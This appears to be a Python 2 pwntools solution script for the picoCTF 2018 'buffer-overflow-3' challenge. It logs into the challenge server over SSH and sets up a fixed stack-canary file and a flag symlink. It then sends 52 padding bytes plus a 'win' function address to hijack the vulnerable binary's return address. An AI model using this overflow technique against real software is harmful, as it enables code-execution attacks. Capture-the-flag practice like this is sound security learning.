from pwn import *

returnAddressOffset = 52
winAddress = 0x080486eb

pswd = open('/home/osboxes/pass', 'r').read()

s = ssh(host='2018shell1.picoctf.com', user='sploitem', password=pswd, ssh_agent=True)

shell = s.shell('/bin/sh')
shell.sendline('mkdir /tmp/sploitem; echo -n AAAA > canary.txt')
shell.sendline('ln -s /problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/flag.txt /tmp/sploitem/flag.txt')
shell.close()

s.set_working_directory('/tmp/sploitem')

p = s.process('/problems/buffer-overflow-3_3_6bcc2aa22b2b7a4a7e3ca6b2e1194faf/vuln')
print p.recvuntil('the Buffer?')

p.sendline('56')
print p.recvuntil('>')

p.sendline('A'*returnAddressOffset + p32(winAddress))
print p.recvline()
print p.recvline(timeout=3)

p.close()
s.close()